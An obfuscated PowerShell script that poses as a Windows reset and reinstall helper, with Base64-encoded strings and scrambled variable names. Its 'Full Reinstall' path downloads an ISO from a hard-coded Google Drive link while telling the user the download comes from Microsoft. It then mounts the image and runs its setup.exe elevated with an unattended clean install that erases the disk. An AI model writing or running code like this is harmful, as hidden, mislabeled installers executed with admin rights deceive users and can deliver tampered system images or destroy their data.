
Add-Type -AssemblyName System.Windows.Forms
function __/\_/=\_/=\/\_/== {
    try {
        gcm systemreset -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}
function _/=\__/==\__/\/=== {
    param (
        [string]${__/=\/\/==\_/\/=\/},
        [string]${__/\/\/\/=\_/\/==\}
    )
    try {
        ${_____/====\___/\/} = New-Object System.Net.WebClient
        ${_____/====\___/\/}.DownloadProgressChanged += {
            Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAHcAbgBsAG8AYQBkAGkAbgBnACAASQBTAE8A'))) -Status ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0AJQA='))) -f $_.ProgressPercentage) -PercentComplete $_.ProgressPercentage
        }
        ${_____/====\___/\/}.DownloadFileAsync(${__/=\/\/==\_/\/=\/}, ${__/\/\/\/=\_/\/==\})
        while (${_____/====\___/\/}.IsBusy) { sleep -Milliseconds 500 }
        Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAHcAbgBsAG8AYQBkAGkAbgBnACAASQBTAE8A'))) -Completed
        return $true
    } catch {
        return $false
    }
}
if (__/\_/=\_/=\/\_/==) {
    ${/==\/\__/\_/\_/==} = New-Object System.Windows.Forms.Form
    ${/==\/\__/\_/\_/==}.Text = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFIAZQBzAGUAdAAgAE8AcAB0AGkAbwBuAHMA')))
    ${/==\/\__/\_/\_/==}.Size = New-Object Drawing.Size(350,150)
    ${/==\/\__/\_/\_/==}.StartPosition = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAG4AdABlAHIAUwBjAHIAZQBlAG4A')))
    ${__/\/\__/=\/=====} = New-Object System.Windows.Forms.Label
    ${__/\/\__/=\/=====}.Text = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAG8AbwBzAGUAIABoAG8AdwAgAHQAbwAgAHIAZQBmAHIAZQBzAGgAIAB0AGgAaQBzACAAUABDADoA')))
    ${__/\/\__/=\/=====}.AutoSize = $true
    ${__/\/\__/=\/=====}.Location = New-Object Drawing.Point(10,20)
    ${/==\/\__/\_/\_/==}.Controls.Add(${__/\/\__/=\/=====})
    ${___/=\/==\/\_/=\_} = New-Object System.Windows.Forms.Button
    ${___/=\/==\/\_/=\_}.Text = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGkAYwBrACAAUgBlAHMAZQB0AA==')))
    ${___/=\/==\/\_/=\_}.Location = New-Object Drawing.Point(30,60)
    ${___/=\/==\/\_/=\_}.Add_Click({
        ${/==\/\__/\_/\_/==}.Tag = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAHMAZQB0AA==')))
        ${/==\/\__/\_/\_/==}.Close()
    })
    ${/==\/\__/\_/\_/==}.Controls.Add(${___/=\/==\/\_/=\_})
    ${/==\/\__/=\/=====} = New-Object System.Windows.Forms.Button
    ${/==\/\__/=\/=====}.Text = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbAAgAFIAZQBpAG4AcwB0AGEAbABsAA==')))
    ${/==\/\__/=\/=====}.Location = New-Object Drawing.Point(150,60)
    ${/==\/\__/=\/=====}.Add_Click({
        ${/==\/\__/\_/\_/==}.Tag = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGkAbgBzAHQAYQBsAGwA')))
        ${/==\/\__/\_/\_/==}.Close()
    })
    ${/==\/\__/\_/\_/==}.Controls.Add(${/==\/\__/=\/=====})
    ${/==\/\__/\_/\_/==}.ShowDialog() | Out-Null
    if (${/==\/\__/\_/\_/==}.Tag -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAHMAZQB0AA==')))) {
        Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAFcAaQBuAGQAbwB3AHMAIABSAGUAcwBlAHQALgAuAC4A')))
        saps $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB5AHMAdABlAG0AcgBlAHMAZQB0AC4AZQB4AGUA'))) -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBmAGEAYwB0AG8AcgB5AHIAZQBzAGUAdAA=')))
        exit
    }
    elseif (${/==\/\__/\_/\_/==}.Tag -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGkAbgBzAHQAYQBsAGwA')))) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAYwBoAG8AaQBjAGUAIABtAGEAZABlAC4AIABFAHgAaQB0AGkAbgBnAC4A')))
        exit
    }
}
Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcABhAHIAaQBuAGcAIABGAHUAbABsACAAUgBlAGkAbgBzAHQAYQBsAGwAIAB2AGkAYQAgAHMAZQB0AHUAcAAuAGUAeABlAC4ALgAuAA==')))
${/=\_/\/\__/\_/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGQAcgBpAHYAZQAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwB1AGMAPwBlAHgAcABvAHIAdAA9AGQAbwB3AG4AbABvAGEAZAAmAGkAZAA9ADEANwBkAEIAbABXAFYASgBBAHgAeQBiAFgAaQBKAEcASABUAFEAagBpAEgAZgBTAG8AMQA5AEUAYgA1AF8AbgBlAA==')))   
${_/==\_/===\_/\/==}  = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AFQARQBNAFAAXABXAGkAbgAxADEALgBpAHMAbwA=')))
${/==\/\/\/=\_/\/=\} = $null
${_/=\_/\_/====\_/\} = $false
if (${/=\_/\/\__/\_/\_/} -ne "") {
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIABkAGkAcgBlAGMAdAAgAEkAUwBPACAAZABvAHcAbgBsAG8AYQBkACAAZgByAG8AbQAgAE0AaQBjAHIAbwBzAG8AZgB0AC4ALgAuAA==')))
    ${_/=\_/\_/====\_/\} = _/=\__/==\__/\/=== -__/=\/\/==\_/\/=\/ ${/=\_/\/\__/\_/\_/} -__/\/\/\/=\_/\/==\ ${_/==\_/===\_/\/==}
    if (${_/=\_/\_/====\_/\} -and (Test-Path ${_/==\_/===\_/\/==})) {
        ${/==\/\/\/=\_/\/=\} = ${_/==\_/===\_/\/==}
        Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBTAE8AIABkAG8AdwBuAGwAbwBhAGQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAB0AG8AIAAkAHsALwA9AD0AXAAvAFwALwBcAC8APQBcAF8ALwBcAC8APQBcAH0A')))
    } else {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHIAZQBjAHQAIABJAFMATwAgAGQAbwB3AG4AbABvAGEAZAAgAGYAYQBpAGwAZQBkACAAKABsAGkAbgBrACAAbQBhAHkAIABoAGEAdgBlACAAZQB4AHAAaQByAGUAZAApAC4A')))
    }
}
if (-not ${/==\/\/\/=\_/\/=\}) {
    ${/===\__/=\/\____/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAVwBpAG4AMQAxAC4AaQBzAG8A')))
    if (Test-Path ${/===\__/=\/\____/}) {
        ${/==\/\/\/=\_/\/=\} = ${/===\__/=\/\____/}
        Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAZQB4AGkAcwB0AGkAbgBnACAASQBTAE8AOgAgACQAewAvAD0APQBcAC8AXAAvAFwALwA9AFwAXwAvAFwALwA9AFwAfQA=')))
    }
}
if (-not ${/==\/\/\/=\_/\/=\}) {
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGwAbABpAG4AZwAgAGIAYQBjAGsAIAB0AG8AIABNAGUAZABpAGEAIABDAHIAZQBhAHQAaQBvAG4AIABUAG8AbwBsAC4ALgAuAA==')))
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    ${__/\_____/==\/\__} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwB3AG4AbABvAGEAZABzAFwATQBlAGQAaQBhAEMAcgBlAGEAdABpAG8AbgBUAG8AbwBsAF8AVwBpAG4AMQAxAC4AZQB4AGUA')))
    ${__/==\/\___/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGcAbwAuAG0AaQBjAHIAbwBzAG8AZgB0AC4AYwBvAG0ALwBmAHcAbABpAG4AawAvAD8AbABpAG4AawBpAGQAPQAyADEANQA2ADIAOQA1AA==')))
    if (-Not (Test-Path ${__/\_____/==\/\__})) {
        Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAHcAbgBsAG8AYQBkAGkAbgBnACAATQBlAGQAaQBhACAAQwByAGUAYQB0AGkAbwBuACAAVABvAG8AbAAuAC4ALgA=')))
        iwr -Uri ${__/==\/\___/==\/\} -OutFile ${__/\_____/==\/\__} -UseBasicParsing
    }
    ${____/==\/\/\_____} = saps -FilePath ${__/\_____/==\/\__} -PassThru -Verb RunAs
    ${____/==\/\/\_____}.WaitForExit()
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBDAFQAIABjAGwAbwBzAGUAZAAuACAAUABsAGUAYQBzAGUAIABzAGUAbABlAGMAdAAgAEkAUwBPACAAZgBpAGwAZQAgAHkAbwB1ACAAYwByAGUAYQB0AGUAZAAuAA==')))
    ${_/=\/===\/==\/\/=} = New-Object System.Windows.Forms.OpenFileDialog
    ${_/=\/===\/==\/\/=}.Filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBTAE8AIABGAGkAbABlAHMAIAAoACoALgBpAHMAbwApAHwAIAAqAC4AaQBzAG8A')))
    ${_/=\/===\/==\/\/=}.Title = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAIAB0AGgAZQAgAFcAaQBuAGQAbwB3AHMAIAAxADEAIABJAFMATwAgAHkAbwB1ACAAYwByAGUAYQB0AGUAZAA=')))
    if (${_/=\/===\/==\/\/=}.ShowDialog() -eq "OK") {
        ${/==\/\/\/=\_/\/=\} = ${_/=\/===\/==\/\/=}.FileName
        Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAZQBkADoAIAAkAHsALwA9AD0AXAAvAFwALwBcAC8APQBcAF8ALwBcAC8APQBcAH0A')))
    } else {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAASQBTAE8AIABzAGUAbABlAGMAdABlAGQALgAgAEUAeABpAHQAaQBuAGcALgA=')))
        exit
    }
}
if (-not (Test-Path ${/==\/\/\/=\_/\/=\})) {
    Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABmAGkAbgBkACAAbwByACAAZABvAHcAbgBsAG8AYQBkACAASQBTAE8ALgAgAEUAeABpAHQAaQBuAGcALgA=')))
    exit
}
Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHUAbgB0AGkAbgBnACAASQBTAE8ALgAuAC4A')))
${_/\___/\_/\/\_/\_} = Mount-DiskImage -ImagePath ${/==\/\/\/=\_/\/=\} -PassThru
${______/=\_/=\____} = (${_/\___/\_/\/\_/\_} | Get-Volume).DriveLetter + ":"
${__/==\_/\__/=====} = Join-Path ${______/=\_/=\____} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHQAdQBwAC4AZQB4AGUA')))
if (Test-Path ${__/==\_/\__/=====}) {
    ${/\_______/=\_/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBhAHUAdABvACAAYwBsAGUAYQBuACAALwBkAHkAbgBhAG0AaQBjAHUAcABkAGEAdABlACAAZABpAHMAYQBiAGwAZQAgAC8AZQB1AGwAYQAgAGEAYwBjAGUAcAB0ACAALwB1AG4AaQBuAHMAdABhAGwAbAAgAGQAaQBzAGEAYgBsAGUA')))
        saps -FilePath ${__/==\_/\__/=====} -ArgumentList ${/\_______/=\_/=\/} -Verb RunAs
} else {
    Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHQAdQBwAC4AZQB4AGUAIABuAG8AdAAgAGYAbwB1AG4AZAAgAGkAbgAgAG0AbwB1AG4AdABlAGQAIABJAFMATwAhAA==')))
}